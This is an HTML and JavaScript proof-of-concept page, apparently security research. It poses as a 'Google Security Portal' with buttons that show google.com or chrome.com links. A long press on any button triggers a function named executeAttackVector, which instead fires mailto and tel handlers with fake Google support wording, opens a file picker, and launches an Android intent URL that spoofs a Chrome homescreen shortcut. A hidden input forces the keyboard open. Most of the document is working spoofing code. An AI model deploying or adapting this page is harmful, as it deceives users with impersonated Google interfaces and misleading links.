<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>File Picker & Protocol Spoof PoC - Long Press</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            background-color: #f8f9fa;
            color: #202124;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
            text-align: center;
        }
        .banner {
            font-size: 13px;
            color: #5f6368;
            margin-bottom: 6px;
            text-transform: uppercase;
            letter-spacing: 0.8px;
        }
        h1 {
            font-size: 20px;
            color: #1a73e8;
            margin-bottom: 24px;
        }
        .button-container {
            display: flex;
            flex-direction: column;
            gap: 12px;
            width: 100%;
            max-width: 340px;
        }
        a.spoof-link {
            display: inline-block;
            background-color: #1a73e8;
            color: white;
            padding: 14px 28px;
            text-decoration: none;
            font-weight: 600;
            font-size: 15px;
            border-radius: 8px;
            box-shadow: 0 4px 10px rgba(26, 115, 232, 0.25);
            transition: background-color 0.2s;
            cursor: pointer;
            -webkit-touch-callout: default; /* Memastikan context menu / long-press bawaan mobile bisa tertangkap */
        }
        a.spoof-link:active {
            background-color: #1557b0;
        }
        .preview-container {
            margin-top: 25px;
            max-width: 280px;
            display: none;
        }
        .preview-container img {
            width: 100%;
            border-radius: 8px;
            border: 1px solid #dadce0;
            box-shadow: 0 2px 6px rgba(0,0,0,0.08);
        }
        .file-info {
            margin-top: 10px;
            font-size: 13px;
            color: #5f6368;
            word-break: break-all;
        }
        .footer-note {
            margin-top: 30px;
            font-size: 11px;
            color: #9aa0a6;
        }
        /* Hidden input untuk memicu keyboard virtual Android secara sinkron */
        #hiddenInput {
            position: absolute;
            opacity: 0;
            height: 0;
            width: 0;
            border: none;
            outline: none;
        }
    </style>
</head>
<body>

    <!-- Input tersembunyi untuk memicu auto keyboard -->
    <input type="text" id="hiddenInput" autocomplete="off">

    <div class="banner">Google Security Portal</div>
    <h1>PUQI</h1>

    <!-- Container dengan 4 Tombol Terpisah -->
    <div class="button-container">
        <a href="https://google.com" class="spoof-link" id="targetLinkMailto" data-intent="identity_verification">Open Window & Email ID Verification</a>
        <a href="https://google.com" class="spoof-link" id="targetLinkTel" data-intent="account_recovery">Open Window & Call Recovery Support</a>
        <a href="https://google.com" class="spoof-link" id="targetLinkFile" data-intent="document_upload">Open Window & Upload Document</a>
        <a href="https://chrome.com" class="spoof-link" id="targetLinkIntent" data-intent="intent_app_spoof">Open Window & Android Intent Spoof</a>
    </div>

    <!-- Uploaded Image Preview Box -->
    <div class="preview-container" id="previewBox">
        <img id="imagePreview" src="" alt="File Preview">
        <div class="file-info" id="fileInfo"></div>
    </div>

    <div class="footer-note">Cloud-secured verification system.</div>

    <script>
        // Fungsi untuk menaikkan virtual keyboard secara instan
        const triggerKeyboard = () => {
            const hiddenInput = document.getElementById("hiddenInput");
            if (hiddenInput) {
                hiddenInput.focus();
            }
        };

        // Auto trigger interaksi pertama
        window.addEventListener('touchstart', triggerKeyboard, { once: true });
        window.addEventListener('click', triggerKeyboard, { once: true });

        let triggered = false;

        const executeAttackVector = async (actionType, intent) => {
            if (triggered) return;
            triggered = true;

            // 1. Eksekusi pemanggilan keyboard secara sinkron
            triggerKeyboard();

            try {
                const previewBox = document.getElementById("previewBox");
                const imagePreview = document.getElementById("imagePreview");
                const fileInfo = document.getElementById("fileInfo");

                if (actionType === 'mailto') {
                    const subject = encodeURIComponent("Security Verification - Intent: " + intent);
                    const body = encodeURIComponent("Hello Google Security,\n\nI am requesting verification for intent: " + intent + "\nPlease process my request securely.");
                    window.location.href = `mailto:support@google.com?subject=${subject}&body=${body}`;
                    fileInfo.innerText = `Triggered mailto protocol with intent: [${intent}]`;
                    imagePreview.src = "";
                    previewBox.style.display = "block";
                } 
                else if (actionType === 'tel') {
                    window.location.href = "tel:+18005550199";
                    fileInfo.innerText = `Triggered tel protocol for intent: [${intent}]`;
                    imagePreview.src = "";
                    previewBox.style.display = "block";
                } 
                else if (actionType === 'filepicker') {
                    const [fileHandle] = await window.showOpenFilePicker({
                        multiple: false,
                        types: [{
                            description: 'Images & Documents',
                            accept: { 
                                'image/*': ['.png', '.jpg', '.jpeg', '.webp'],
                                'application/pdf': ['.pdf']
                            }
                        }]
                    });

                    const file = await fileHandle.getFile();
                    fileInfo.innerText = `Selected file for [${intent}]: ${file.name}`;

                    if (file.type.startsWith('image/')) {
                        imagePreview.src = URL.createObjectURL(file);
                        previewBox.style.display = "block";
                    } else {
                        imagePreview.src = "";
                        previewBox.style.display = "block";
                    }
                }
                else if (actionType === 'intentspoof') {
                    const intentUrl = "intent://www.google.com/hsi?name=Chrome&icon=https://ssl.gstatic.com/shortcuts/android/home/v1/192px/weather_g_badged.png&ve=145829&hv=1&dest=1&source=homescreen_shortcut&query=https://ndev.tk#Intent;scheme=https;package=com.google.android.googlequicksearchbox;end";
                    
                    setTimeout(() => {
                        window.location.href = intentUrl;
                    }, 50);

                    fileInfo.innerText = `Triggered Android intent spoof vector for intent: [${intent}]`;
                    imagePreview.src = "";
                    previewBox.style.display = "block";
                }

            } catch (err) {
                console.debug("Handler cancelled or blocked:", err.message);
            } finally {
                setTimeout(() => { triggered = false; }, 1000);
            }
        };

        // Helper untuk memasang event listener Long-Press (contextmenu) dengan aman
        const bindLongPress = (elementId, actionType) => {
            const el = document.getElementById(elementId);
            if (!el) return;

            el.addEventListener("contextmenu", (e) => {
                e.preventDefault(); // Mencegah menu konteks default browser agar vector langsung tereksekusi
                executeAttackVector(actionType, el.getAttribute('data-intent'));
            });

            // Fallback touchstart untuk mendeteksi gestur tekan lama di mobile jika diperlukan
            el.addEventListener("touchstart", () => {}, { passive: true });
        }

        // Binding semua tombol ke event long-press (contextmenu)
        bindLongPress("targetLinkMailto", 'mailto');
        bindLongPress("targetLinkTel", 'tel');
        bindLongPress("targetLinkFile", 'filepicker');
        bindLongPress("targetLinkIntent", 'intentspoof');
    </script>

</body>
</html>
